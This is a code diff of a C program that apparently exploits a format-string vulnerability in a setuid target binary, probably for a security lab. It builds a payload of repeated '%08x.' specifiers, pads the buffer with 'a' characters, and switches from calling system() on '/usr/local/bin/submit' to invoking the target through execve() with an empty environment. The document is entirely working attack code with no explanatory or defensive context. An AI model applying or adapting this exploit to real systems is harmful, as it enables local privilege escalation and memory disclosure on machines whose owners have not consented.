@@ -3,6 +3,8 @@
 
 int main(){
 	FILE *fp;
+	char *args[4];
+	char *env[1];
 	int i;
 	int count = 130;
 	int p_cmd_len = 0;
@@ -23,10 +25,15 @@ int main(){
 			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.";
 	char* cmd = (char*)malloc(1000);
 	p_cmd_len = strlen(p_cmd);
-	snprintf(cmd, 1000, "/usr/local/bin/submit %s", p_cmd);
-	for(i =p_cmd_len+2;i<999;i++){
+	strcpy(cmd, p_cmd);
+	for(i =p_cmd_len-1;i<1000;i++){
 		cmd[i] = 'a';
 	}
-	system(cmd);	
+	//system(cmd);	
+	args[0] = TARGET; args[1] = cmd; 
+  	args[2] = "message"; args[3] = NULL;
+  	env[0] = NULL;
+  	if (execve(TARGET, args, env) < 0)
+    		fprintf(stderr, "execve failed.\n");
 	exit(0);
 }
